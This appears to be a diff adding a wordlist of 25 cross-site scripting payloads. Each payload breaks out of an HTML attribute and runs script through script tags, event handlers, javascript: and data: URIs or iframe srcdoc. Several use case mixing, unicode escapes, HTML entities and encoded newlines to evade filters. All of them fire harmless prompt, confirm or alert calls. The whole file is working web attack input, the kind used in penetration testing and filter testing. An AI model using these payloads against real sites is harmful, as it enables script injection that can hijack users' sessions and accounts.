@@ -1,0 +1,25 @@
+</script>"><script>prompt(1)</script>
+</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=prompt(1)>
+"><iframe/src=javascript:prompt(1)>
+"><h1 onclick=prompt(1)>Clickme</h1>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><a href="javascript:confirm%28 1%29">Clickme</a>
+"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+"><textarea autofocus onfocus=prompt(1)>
+"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+"><script>co\u006efir\u006d`1`</script>
+"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
+"><img src=x onerror=co\u006efir\u006d`1`>
+"><svg/onload=co\u006efir\u006d`1`>
+"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+"><a href=javascript:prompt%28 1%29>Clickme</a>
+"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+"><textarea autofocus onfocus=co\u006efir\u006d(1)>
+"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+"><img/src=x%0Aonerror=prompt`1`>
+"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
+"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
